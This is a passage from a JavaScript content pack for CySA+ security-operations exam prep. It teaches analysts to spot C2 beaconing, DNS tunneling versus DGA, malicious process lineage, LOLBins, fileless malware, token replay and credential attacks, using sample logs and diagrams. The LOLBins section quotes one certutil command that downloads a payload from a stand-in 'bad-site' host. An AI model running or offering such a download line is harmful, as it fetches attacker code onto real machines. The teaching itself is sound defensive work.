/* CONTENT PACK: CySA+ | Security Operations (cysa-ops) -- 40 MCQ + 10 PBQ + 5 briefings + boss */
window.PACKS = window.PACKS || {};
window.PACKS["cysa-ops"] = {
lessons: {
"cysa-ops-1": { intro: "Case file open, Ranger. A finance workstation just lit up on the board. Before you touch a single log line, you need to know what you are looking at and why it matters -- this briefing is the whole case, worked from first principles to a finished incident. Budget real time for it; there is no shortcut version.",
sections: [
{ h: "Why this topic exists: the analyst's actual job", b: "Every day, a SOC analyst is handed a wall of data -- firewall logs, proxy logs, EDR telemetry, identity sign-in logs, cloud audit trails -- and asked one question over and over: is this normal, or is this an attack? The CySA+ exam tests this exact skill, and it tests it HARD, because it is the actual job. You will not be asked to define 'indicator of compromise' in a vacuum. You will be shown ten raw log lines and asked which single detail proves malicious activity, and which details are red herrings meant to waste your time. This briefing is built the same way: every concept below is followed by the EXACT shape of data you will be shown on the exam, so that when you see it for real, you recognize it instantly instead of reasoning it out from scratch under time pressure." },
{ h: "The three buckets: network, host, and identity/cloud indicators", b: "Every indicator of malicious activity you will ever be asked about falls into one of three buckets, and the first move in any question is figuring out which bucket you are in. NETWORK indicators live in traffic: beaconing, unusual ports, DNS anomalies, traffic volume that does not match a host's normal role. HOST indicators live on the endpoint: which process launched which other process, unexpected persistence mechanisms, resource spikes, files or registry keys that should not exist. IDENTITY and CLOUD indicators live in authentication and API activity: impossible travel, off-hours logins, MFA abuse, cloud API calls made by accounts or from locations that do not make sense. Almost every exam scenario is secretly asking 'which bucket is this, and what specific field in the data proves it' -- so as you read the rest of this briefing, keep sorting everything you learn into one of these three buckets. By the end, you should be able to glance at any raw log excerpt and immediately say network, host, or identity, before you even work out the specific technique." },
{ h: "Network indicator #1: beaconing, the unmistakable C2 signature", b: "Malware that has successfully compromised a machine needs to talk to its operator eventually -- to receive new instructions, to exfiltrate data, to know the implant is still alive. The overwhelming majority of malware does this on a TIMER, checking in with its command-and-control (C2) server at a fixed interval, because writing code that checks in on a schedule is far simpler and more reliable than writing code that waits for some unpredictable trigger. This produces a signature that, once you have seen it, you will never miss again: FIXED TIME INTERVALS between connections, combined with NEAR-IDENTICAL BYTE SIZES, to the SAME destination, over and over. Compare that to how an actual human uses the internet: bursty, irregular, wildly variable in size, hitting dozens of different destinations in no particular rhythm. A person does not load a 412-byte page from the same server every 300 seconds, forever, all day. If you see that pattern in a proxy log or firewall log, you are looking at a beacon -- full stop. The picture below makes this impossible to miss once you have seen it side by side.", data: "09:00:04 GET sync-cdn[.]net/a  402B\n09:05:04 GET sync-cdn[.]net/a  402B\n09:10:05 GET sync-cdn[.]net/a  403B   <- exactly 5 min apart, ~same size, same host = BEACON\n09:11:20 GET news.site.com     91KB  <- one page load, normal, NOT an indicator by itself", svg: "<svg viewBox=\"0 0 640 220\" xmlns=\"http://www.w3.org/2000/svg\" style=\"width:100%;height:auto;max-width:640px;display:block;margin:0 auto;\">\n<text x=\"10\" y=\"18\" font-family=\"monospace\" font-size=\"12\" fill=\"#6A3FA0\">HUMAN BROWSING (bursty, irregular size and timing)</text>\n<line x1=\"10\" y1=\"40\" x2=\"630\" y2=\"40\" stroke=\"#DCE2EB\" stroke-width=\"1\"/>\n<rect x=\"20\" y=\"25\" width=\"8\" height=\"15\" fill=\"#2E6DB4\"/>\n<rect x=\"55\" y=\"15\" width=\"8\" height=\"25\" fill=\"#2E6DB4\"/>\n<rect x=\"140\" y=\"30\" width=\"8\" height=\"10\" fill=\"#2E6DB4\"/>\n<rect x=\"210\" y=\"10\" width=\"8\" height=\"30\" fill=\"#2E6DB4\"/>\n<rect x=\"380\" y=\"22\" width=\"8\" height=\"18\" fill=\"#2E6DB4\"/>\n<rect x=\"600\" y=\"18\" width=\"8\" height=\"22\" fill=\"#2E6DB4\"/>\n<text x=\"10\" y=\"90\" font-family=\"monospace\" font-size=\"12\" fill=\"#D64545\">MALWARE BEACONING (fixed interval, near-identical size)</text>\n<line x1=\"10\" y1=\"110\" x2=\"630\" y2=\"110\" stroke=\"#DCE2EB\" stroke-width=\"1\"/>\n<rect x=\"20\" y=\"98\" width=\"8\" height=\"12\" fill=\"#D64545\"/>\n<rect x=\"90\" y=\"98\" width=\"8\" height=\"12\" fill=\"#D64545\"/>\n<rect x=\"160\" y=\"98\" width=\"8\" height=\"12\" fill=\"#D64545\"/>\n<rect x=\"230\" y=\"98\" width=\"8\" height=\"12\" fill=\"#D64545\"/>\n<rect x=\"300\" y=\"98\" width=\"8\" height=\"12\" fill=\"#D64545\"/>\n<rect x=\"370\" y=\"98\" width=\"8\" height=\"12\" fill=\"#D64545\"/>\n<rect x=\"440\" y=\"98\" width=\"8\" height=\"12\" fill=\"#D64545\"/>\n<rect x=\"510\" y=\"98\" width=\"8\" height=\"12\" fill=\"#D64545\"/>\n<rect x=\"580\" y=\"98\" width=\"8\" height=\"12\" fill=\"#D64545\"/>\n<text x=\"10\" y=\"145\" font-family=\"monospace\" font-size=\"11\" fill=\"#333C4D\">Same interval every time (70px = 5 min) + same bar height (byte size)</text>\n<text x=\"10\" y=\"165\" font-family=\"monospace\" font-size=\"11\" fill=\"#333C4D\">= timer-driven check-in to ONE destination = C2 beacon signature</text>\n<text x=\"10\" y=\"195\" font-family=\"monospace\" font-size=\"11\" fill=\"#7A8699\">Human traffic: variable gaps, variable sizes, many destinations</text>\n</svg>" },
{ h: "Reading the beacon diagram: what actually proves it, and what does not", b: "Look carefully at what is doing the proving in that picture. It is NOT the destination being unfamiliar -- attackers frequently use legitimate-sounding CDN-style domain names precisely so a quick glance does not raise suspicion. It is NOT the byte size alone -- 402 bytes is a tiny, utterly unremarkable transfer on its own. It is NOT even really the domain's reputation -- a brand-new, never-seen-before domain with one single connection tells you far less than an ordinary-looking domain contacted nine times at an identical five-minute interval. What proves it is the COMBINATION: fixed timing PLUS uniform size PLUS a single repeating destination. Take any one of those three away and the case gets much weaker. This is why an exam question that offers you 'the 91KB transfer to news.site.com' as a tempting wrong answer is testing exactly this: a single normal-sized page load, even a large one, means nothing without the periodicity that makes a beacon a beacon." },
{ h: "Network indicator #2: DNS as a covert channel -- tunneling versus DGA", b: "DNS is one of the few protocols that is almost never blocked outbound, which makes it an attractive channel for attackers -- but they use it in two fundamentally different ways that the exam loves to test as a pair, specifically because they look superficially similar (lots of DNS queries, weird-looking subdomains) but mean opposite things. DNS TUNNELING is an attacker who ALREADY HAS a working, established C2 channel and is using DNS queries themselves as the transport -- encoding stolen data, or incoming commands, directly INTO the subdomain portion of the query. You will see THOUSANDS of queries to the SAME registered domain, each with a unique, high-entropy, base64-or-hex-looking subdomain label, and critically, these queries actually RESOLVE, because the attacker's own DNS server is on the other end, decoding the payload. A DOMAIN GENERATION ALGORITHM (DGA), by total contrast, is malware that does NOT yet have a live C2 server and is trying to FIND one -- it algorithmically generates a long list of candidate domain names (using a seed like the date, so the attacker's own infrastructure can register the matching domain on the right day) and queries them one after another. You will see queries to MANY DIFFERENT domains, and the overwhelming majority of them will FAIL to resolve (NXDOMAIN), because only one domain out of the whole generated list is actually registered and live on any given day.", svg: "<svg viewBox=\"0 0 640 260\" xmlns=\"http://www.w3.org/2000/svg\" style=\"width:100%;height:auto;max-width:640px;display:block;margin:0 auto;\">\n<rect x=\"10\" y=\"10\" width=\"300\" height=\"230\" rx=\"8\" fill=\"#F7F3FC\" stroke=\"#6A3FA0\" stroke-width=\"1.5\"/>\n<text x=\"160\" y=\"32\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"13\" font-weight=\"bold\" fill=\"#6A3FA0\">DNS TUNNELING</text>\n<text x=\"25\" y=\"55\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">ONE domain, MANY unique subdomains:</text>\n<text x=\"25\" y=\"75\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#3E9B4F\">aGVsbG8x.k2.datapipe.io</text>\n<text x=\"25\" y=\"90\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#3E9B4F\">dGVzdDEy.k2.datapipe.io</text>\n<text x=\"25\" y=\"105\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#3E9B4F\">c2VjcmV0.k2.datapipe.io</text>\n<text x=\"25\" y=\"130\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">Domain stays CONSTANT</text>\n<text x=\"25\" y=\"148\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">Subdomain = encoded DATA payload</text>\n<text x=\"25\" y=\"166\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">Every query RESOLVES (real C2 channel)</text>\n<text x=\"25\" y=\"190\" font-family=\"monospace\" font-size=\"10\" fill=\"#D64545\">Goal: smuggle data through port 53</text>\n<rect x=\"330\" y=\"10\" width=\"300\" height=\"230\" rx=\"8\" fill=\"#FFF7EC\" stroke=\"#C8901A\" stroke-width=\"1.5\"/>\n<text x=\"480\" y=\"32\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"13\" font-weight=\"bold\" fill=\"#C8901A\">DGA (DOMAIN GEN. ALGORITHM)</text>\n<text x=\"345\" y=\"55\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">MANY different domains, mostly dead:</text>\n<text x=\"345\" y=\"75\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#D64545\">xk4jf9a2.com -> NXDOMAIN</text>\n<text x=\"345\" y=\"90\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#D64545\">q83jak1z.net -> NXDOMAIN</text>\n<text x=\"345\" y=\"105\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#3E9B4F\">bz9a01xx.io  -> RESOLVES (today's C2)</text>\n<text x=\"345\" y=\"130\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">Domain CHANGES constantly</text>\n<text x=\"345\" y=\"148\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">Subdomain is not the point</text>\n<text x=\"345\" y=\"166\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">Most queries FAIL to resolve</text>\n<text x=\"345\" y=\"190\" font-family=\"monospace\" font-size=\"10\" fill=\"#D64545\">Goal: FIND today's live C2 server</text>\n</svg>" },
{ h: "Why the tunneling versus DGA distinction is worth memorizing cold", b: "The exam will give you a short excerpt of DNS query logs and ask you to name the technique, and the trap is that both techniques produce 'lots of weird DNS activity,' so a rushed reader who does not check the SHAPE of the data will guess wrong half the time. The single fastest discriminator: count how many distinct REGISTERED (second-level) domains appear. One domain, many subdomains, all resolving means tunneling. Many domains, mostly failing means DGA. If you remember nothing else from this section, remember that one test, because it resolves the question in about two seconds flat once you know to look for it." },
{ h: "Host indicator: parent-child process lineage, and why it beats everything else", b: "Every process on a computer has a parent -- the process that launched it -- and that parent-child relationship is one of the single richest sources of evidence available to an analyst, because MOST malicious activity produces a parent-child pairing that would never happen during normal, legitimate use of the machine. The single most tested example on the exam: WINWORD.EXE (Microsoft Word) spawning powershell.exe, especially with an encoded command-line argument (-enc or -EncodedCommand). This lineage means a MALICIOUS MACRO embedded in a Word document just executed code the instant the document was opened -- and this is worth saying plainly because the exam will offer you tempting-sounding innocent explanations: it is NOT a routine Office add-in update (those do not spawn PowerShell at all, let alone an encoded command), and it is NOT IT admin maintenance tooling (legitimate admin tools run from management agents like SCCM or Intune, which have their own distinct, expected parent process -- never from inside Word itself). services.exe spawning cmd.exe is another lineage that should stop you cold: core Windows service processes do not normally drop into an interactive command shell." },
{ h: "The full attack chain, visualized", b: "Here is the complete story, from a user's ordinary click to a live malicious process, laid out as a tree. Notice that every hop except the last one is completely routine, expected behavior -- a user is in their desktop session (explorer.exe), they open Outlook, they open an attachment. The entire indicator, the ENTIRE case, rests on one single hop: Word should never, under any legitimate circumstance, spawn an encoded PowerShell child process. That is the whole tell. You do not need ten reasons to be suspicious here -- you need exactly one, and it is this parent-child pairing.", svg: "<svg viewBox=\"0 0 640 260\" xmlns=\"http://www.w3.org/2000/svg\" style=\"width:100%;height:auto;max-width:640px;display:block;margin:0 auto;\">\n<rect x=\"20\" y=\"15\" width=\"200\" height=\"40\" rx=\"6\" fill=\"#E8F4EA\" stroke=\"#3E9B4F\" stroke-width=\"1.5\"/>\n<text x=\"120\" y=\"34\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"11\" fill=\"#1E2430\">explorer.exe</text>\n<text x=\"120\" y=\"48\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"9\" fill=\"#7A8699\">(user session)</text>\n<line x1=\"120\" y1=\"55\" x2=\"120\" y2=\"85\" stroke=\"#7A8699\" stroke-width=\"1.5\"/>\n<rect x=\"20\" y=\"85\" width=\"200\" height=\"40\" rx=\"6\" fill=\"#E8F4EA\" stroke=\"#3E9B4F\" stroke-width=\"1.5\"/>\n<text x=\"120\" y=\"104\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"11\" fill=\"#1E2430\">OUTLOOK.EXE</text>\n<text x=\"120\" y=\"118\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"9\" fill=\"#7A8699\">user opens invoice_Q3.docm</text>\n<line x1=\"120\" y1=\"125\" x2=\"120\" y2=\"155\" stroke=\"#D64545\" stroke-width=\"2\"/>\n<rect x=\"20\" y=\"155\" width=\"200\" height=\"40\" rx=\"6\" fill=\"#FBE7E7\" stroke=\"#D64545\" stroke-width=\"1.5\"/>\n<text x=\"120\" y=\"174\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"11\" fill=\"#1E2430\">WINWORD.EXE</text>\n<text x=\"120\" y=\"188\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"9\" fill=\"#D64545\">macro auto-runs on open</text>\n<line x1=\"120\" y1=\"195\" x2=\"120\" y2=\"225\" stroke=\"#D64545\" stroke-width=\"2.5\"/>\n<rect x=\"20\" y=\"225\" width=\"200\" height=\"30\" rx=\"6\" fill=\"#D64545\"/>\n<text x=\"120\" y=\"245\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"10.5\" fill=\"#fff\">powershell.exe -enc JABzA...</text>\n<text x=\"260\" y=\"105\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">Expected, routine lineage:</text>\n<text x=\"260\" y=\"122\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">explorer -> Outlook -> Word</text>\n<text x=\"260\" y=\"175\" font-family=\"monospace\" font-size=\"10\" fill=\"#D64545\" font-weight=\"bold\">Alarm point:</text>\n<text x=\"260\" y=\"192\" font-family=\"monospace\" font-size=\"10\" fill=\"#D64545\">Word should NEVER spawn</text>\n<text x=\"260\" y=\"207\" font-family=\"monospace\" font-size=\"10\" fill=\"#D64545\">an encoded PowerShell child.</text>\n<text x=\"260\" y=\"230\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">This single parent-child hop</text>\n<text x=\"260\" y=\"245\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">is the entire indicator.</text>\n</svg>" },
{ h: "Living-off-the-land binaries (LOLBins): why trusted tools are the preferred weapon", b: "Attackers increasingly avoid dropping custom malware executables onto disk at all, because a brand-new, unsigned, never-before-seen binary is exactly what antivirus and application allowlisting are built to catch. Instead, they abuse LIVING-OFF-THE-LAND BINARIES (LOLBins) -- legitimate, digitally-signed tools that ship with Windows itself and are present on essentially every machine, so their mere existence and even their normal execution triggers nothing. Learn this short list cold, because the exam draws from it repeatedly: powershell.exe (scripting and automation, hugely powerful, hugely abused), wscript.exe and cscript.exe (Windows Script Host, runs .vbs and .js files), certutil.exe (a certificate management utility that can also be abused with url-fetch flags to DOWNLOAD a remote file -- certutil -urlcache -split -f http://bad-site/payload.exe is a real, frequently tested pattern), rundll32.exe (loads and runs code from a DLL, used to proxy-execute malicious code through a trusted binary), and mshta.exe (runs HTML Application files, another common way to execute a script while looking like a benign Microsoft-signed process). The exam question is never 'is powershell.exe suspicious' -- powershell.exe running is completely normal on almost every Windows machine, all day, every day. The question is always about the PARENT process, the ARGUMENTS passed to it, and where it is reaching out to -- context is everything, the binary name alone is nothing." },
{ h: "Fileless malware: the case where a clean disk scan is not good news", b: "Here is a scenario built specifically to catch analysts who trust the wrong tool: EDR is showing a live, actively-held-open command-and-control connection running through powershell.exe, but a full antivirus disk scan comes back completely clean -- no malicious files found anywhere. An inexperienced analyst concludes the EDR alert must be a false positive, since surely a real infection would leave a file behind. This conclusion is wrong, and it is wrong for an architectural reason, not a tooling-quality reason: FILELESS MALWARE injects its malicious payload directly into the MEMORY of a legitimate, already-running process, and never writes a file to disk at all. There is nothing for a disk scanner to find, no matter how current its signatures are, because disk scanning fundamentally only looks at files sitting on disk -- it has no visibility into what is executing purely in memory. The live network connection observed by EDR is the stronger piece of evidence here, precisely because EDR monitors process behavior and memory activity, which is the only place this threat actually exists. Do not let a clean disk scan talk you out of what EDR is telling you." },
{ h: "Identity indicator: impossible travel, and the detail that changes everything", b: "Impossible travel is exactly what it sounds like: the same account authenticating from Dallas at 09:02 and then from Lagos at 09:47 -- a physical distance no human being could cover in 45 minutes. Most analysts stop there and conclude 'the password was compromised, force a reset.' But the exam rewards analysts who read ONE MORE FIELD: what does the MFA status say on that second, impossible login? If it shows a FRESH MFA CHALLENGE that the attacker somehow also passed, that is unusual and worth its own investigation. But if it shows 'MFA previously satisfied' -- meaning no new MFA prompt was issued or required at all -- that is the signature of SESSION TOKEN THEFT AND REPLAY. The attacker did not crack a password and log in fresh; they stole an already-authenticated session token (through malware, a phishing proxy, or a leaked browser cookie) and are simply reusing it. This distinction changes your entire response: a compromised password calls for a password reset, but a stolen, replayed token is not evicted by a password reset at all -- the token remains valid completely independently of the password until it is explicitly revoked. Get this distinction wrong on the exam or on the job and your fix leaves the attacker sitting inside the account.", data: "j.rivera: Dallas 08:58, MFA challenge passed (fresh)\nj.rivera: overseas IP 09:36, 'MFA previously satisfied' (NO fresh challenge)\n  -> the giveaway phrase: no new MFA event fired, an old valid session is simply being reused\n  -> conclusion: session token theft/replay, NOT a newly cracked password" },
{ h: "Other identity indicators worth naming on sight", b: "Beyond impossible travel, watch for: logins at 3 a.m. from an account that has a strict, well-established 9-to-5 pattern (a baseline deviation, even without impossible geography); and a sudden BURST of MFA PUSH NOTIFICATIONS to one user in a short window with no corresponding login attempt the user actually initiated -- this is an MFA FATIGUE (or prompt-bombing) attack, where an attacker who already has a valid password spams approval requests hoping an annoyed or confused user eventually taps Approve just to make the notifications stop. Notice this attack requires no password guessing at all once the password is already known -- it is purely a social-engineering play against the approval prompt itself." },
{ h: "The four credential-attack shapes: read the ratio, not just the word 'failed'", b: "The exam frequently shows you a block of authentication log data -- some failed logins, maybe a success or two -- and asks you to classify the attack, and the trap is that all four of the following attacks superficially involve 'failed logins,' so you must read the SHAPE of the data (how many accounts, how many attempts per account, from how many sources) rather than reacting to the word 'failed' alone. PASSWORD SPRAYING is ONE source IP hitting MANY different accounts with only one or two attempts against EACH account -- wide and shallow, deliberately staying under per-account lockout thresholds. BRUTE FORCE is the inverse: ONE source IP hammering ONE (or very few) accounts with HUNDREDS of attempts -- narrow and deep. MFA FATIGUE involves NO password guessing whatsoever -- the password is already known, and the attack is entirely repeated push-notification approval requests against one user. CREDENTIAL STUFFING uses username-and-password PAIRS that were already breached somewhere else entirely (a different, unrelated company's data breach), tried against your login with no guessing pattern at all -- each pair is either simply valid or simply invalid, with no brute-force rhythm to it because the attacker already believes the pair is likely correct.", svg: "<svg viewBox=\"0 0 640 300\" xmlns=\"http://www.w3.org/2000/svg\" style=\"width:100%;height:auto;max-width:640px;display:block;margin:0 auto;\">\n<rect x=\"10\" y=\"10\" width=\"300\" height=\"130\" rx=\"8\" fill=\"#F0F5FB\" stroke=\"#2E6DB4\" stroke-width=\"1.5\"/>\n<text x=\"160\" y=\"30\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"12\" font-weight=\"bold\" fill=\"#2E6DB4\">PASSWORD SPRAY</text>\n<text x=\"25\" y=\"52\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">1 source IP</text>\n<text x=\"25\" y=\"68\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">-> 84 DIFFERENT accounts</text>\n<text x=\"25\" y=\"84\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">-> 1-2 attempts EACH</text>\n<text x=\"25\" y=\"105\" font-family=\"monospace\" font-size=\"10\" fill=\"#D64545\">Wide and shallow</text>\n<text x=\"25\" y=\"122\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#7A8699\">(stays under lockout thresholds)</text>\n<rect x=\"330\" y=\"10\" width=\"300\" height=\"130\" rx=\"8\" fill=\"#FBE7E7\" stroke=\"#D64545\" stroke-width=\"1.5\"/>\n<text x=\"480\" y=\"30\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"12\" font-weight=\"bold\" fill=\"#D64545\">BRUTE FORCE</text>\n<text x=\"345\" y=\"52\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">1 source IP</text>\n<text x=\"345\" y=\"68\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">-> 1 SINGLE account</text>\n<text x=\"345\" y=\"84\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">-> HUNDREDS of attempts</text>\n<text x=\"345\" y=\"105\" font-family=\"monospace\" font-size=\"10\" fill=\"#D64545\">Narrow and deep</text>\n<text x=\"345\" y=\"122\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#7A8699\">(inverse shape of spray)</text>\n<rect x=\"10\" y=\"155\" width=\"300\" height=\"130\" rx=\"8\" fill=\"#FFF7EC\" stroke=\"#C8901A\" stroke-width=\"1.5\"/>\n<text x=\"160\" y=\"175\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"12\" font-weight=\"bold\" fill=\"#C8901A\">MFA FATIGUE</text>\n<text x=\"25\" y=\"197\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">Password ALREADY known</text>\n<text x=\"25\" y=\"213\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">-> 30 push prompts, 1 user</text>\n<text x=\"25\" y=\"229\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">-> hoping for 1 accidental tap</text>\n<text x=\"25\" y=\"250\" font-family=\"monospace\" font-size=\"10\" fill=\"#D64545\">No password guessing at all</text>\n<rect x=\"330\" y=\"155\" width=\"300\" height=\"130\" rx=\"8\" fill=\"#F7F3FC\" stroke=\"#6A3FA0\" stroke-width=\"1.5\"/>\n<text x=\"480\" y=\"175\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"12\" font-weight=\"bold\" fill=\"#6A3FA0\">CREDENTIAL STUFFING</text>\n<text x=\"345\" y=\"197\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">Breached user:pass PAIRS</text>\n<text x=\"345\" y=\"213\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">from an unrelated site</text>\n<text x=\"345\" y=\"229\" font-family=\"monospace\" font-size=\"10\" fill=\"#333C4D\">-> each tried once, no guessing</text>\n<text x=\"345\" y=\"250\" font-family=\"monospace\" font-size=\"10\" fill=\"#D64545\">Valid-looking pairs, no pattern</text>\n</svg>" },
{ h: "Cloud identity indicators: the anatomy of a cloud audit log entry", b: "Cloud environments produce a different flavor of identity evidence: the AUDIT LOG. Every meaningful cloud audit log entry has the same core anatomy you must learn to scan instantly: the PRINCIPAL (which user or service account performed the action), the ACTION (what API call was made -- ListBuckets, GetObject, CreateUser, AttachRolePolicy, and so on), the SOURCE IP (where the call originated from), the TIME, and the RESULT (success or failure). A single suspicious cloud incident almost always combines several of these fields going wrong AT ONCE, and the exam tests whether you can spot the full combination rather than fixating on just one field. Consider a service account named svc-backup-old that has not been used in eight months suddenly calling ListBuckets and then GetObject four hundred times, originating from a RESIDENTIAL internet address rather than the cloud provider's own network, at 2:30 in the morning. No single fact here is damning by itself -- backups legitimately run overnight, GetObject is an entirely routine API call, and service accounts are normal. It is the FULL COMBINATION -- a DORMANT credential, suddenly ACTIVE, from an UNEXPECTED source, performing BULK enumeration and reads -- that adds up to a compromised credential being used by an attacker for the very first time. Do not let an exam question talk you into blaming the API call name (GetObject is not inherently dangerous) or the timestamp alone (overnight is not inherently suspicious) -- the case is built on the combination.", data: "principal: svc-backup-old | action: ListBuckets, GetObject x400\nsourceIP: residential ISP | time: 02:30 | last legitimate use: 8 months ago\n-> no single field proves it; the COMBINATION of dormancy + unexpected source + bulk reads does" },
{ h: "Scoping an incident: which evidence source do you reach for first", b: "Once you have a confirmed indicator -- a malicious domain, a file hash, a compromised account -- your very next job is SCOPING: finding every other host or account touched by the same activity, as fast as possible, before deciding how to contain it. This is where analysts under time pressure make a very costly mistake: reaching for the wrong tool first. FLOW DATA (NetFlow) and PROXY LOGS are your first move for broad scoping, because they are cheap to store and typically retained for a LONG window (often ninety days), letting you ask 'which hosts talked to this domain at any point over the last three months' in a single query -- though they contain only metadata (source, destination, ports, size, timing), never the actual payload content. FULL PACKET CAPTURE (PCAP) is the only source that preserves actual PAYLOAD CONTENT -- what was actually sent -- but it is expensive to store and is usually only retained for a short ROLLING window, often as little as forty-eight hours. That makes PCAP the wrong tool for scoping something that may have started weeks ago; use it only to prove exactly what data left a host you have ALREADY identified as involved. EDR/endpoint telemetry is your tool for seeing fileless malware, process lineage, and memory-resident activity that neither flow logs nor PCAP can show you at all.", svg: "<svg viewBox=\"0 0 640 240\" xmlns=\"http://www.w3.org/2000/svg\" style=\"width:100%;height:auto;max-width:640px;display:block;margin:0 auto;\">\n<text x=\"320\" y=\"20\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"12\" font-weight=\"bold\" fill=\"#1E2430\">CHOOSING THE RIGHT EVIDENCE SOURCE</text>\n<rect x=\"10\" y=\"40\" width=\"195\" height=\"170\" rx=\"8\" fill=\"#E8F4EA\" stroke=\"#3E9B4F\" stroke-width=\"1.5\"/>\n<text x=\"107\" y=\"62\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"11\" font-weight=\"bold\" fill=\"#3E9B4F\">FLOW / PROXY</text>\n<text x=\"22\" y=\"84\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">Retention: ~90 days</text>\n<text x=\"22\" y=\"100\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">Contains: metadata only</text>\n<text x=\"22\" y=\"116\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">(src/dst/ports/size/time)</text>\n<text x=\"22\" y=\"140\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#D64545\" font-weight=\"bold\">Best for:</text>\n<text x=\"22\" y=\"156\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">broad, LONG-horizon</text>\n<text x=\"22\" y=\"172\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">SCOPING -- who else</text>\n<text x=\"22\" y=\"188\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">talked to this IoC</text>\n<rect x=\"222\" y=\"40\" width=\"195\" height=\"170\" rx=\"8\" fill=\"#FBE7E7\" stroke=\"#D64545\" stroke-width=\"1.5\"/>\n<text x=\"319\" y=\"62\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"11\" font-weight=\"bold\" fill=\"#D64545\">FULL PCAP</text>\n<text x=\"234\" y=\"84\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">Retention: ~48 hours</text>\n<text x=\"234\" y=\"100\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">Contains: full PAYLOAD</text>\n<text x=\"234\" y=\"116\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">(actual bytes sent)</text>\n<text x=\"234\" y=\"140\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#D64545\" font-weight=\"bold\">Best for:</text>\n<text x=\"234\" y=\"156\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">proving exact CONTENT</text>\n<text x=\"234\" y=\"172\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">on a host you already</text>\n<text x=\"234\" y=\"188\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">know is involved</text>\n<rect x=\"434\" y=\"40\" width=\"195\" height=\"170\" rx=\"8\" fill=\"#F0F5FB\" stroke=\"#2E6DB4\" stroke-width=\"1.5\"/>\n<text x=\"531\" y=\"62\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"11\" font-weight=\"bold\" fill=\"#2E6DB4\">EDR / ENDPOINT</text>\n<text x=\"446\" y=\"84\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">Retention: varies (long)</text>\n<text x=\"446\" y=\"100\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">Contains: process, memory,</text>\n<text x=\"446\" y=\"116\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">registry, file activity</text>\n<text x=\"446\" y=\"140\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#D64545\" font-weight=\"bold\">Best for:</text>\n<text x=\"446\" y=\"156\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">seeing FILELESS malware</text>\n<text x=\"446\" y=\"172\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">and process lineage that</text>\n<text x=\"446\" y=\"188\" font-family=\"monospace\" font-size=\"9.5\" fill=\"#333C4D\">disk scans cannot show</text>\n<text x=\"320\" y=\"228\" text-anchor=\"middle\" font-family=\"monospace\" font-size=\"10\" fill=\"#7A8699\">Scope broad first (flow/proxy) -- then confirm content (PCAP) or host behavior (EDR)</text>\n</svg>" },
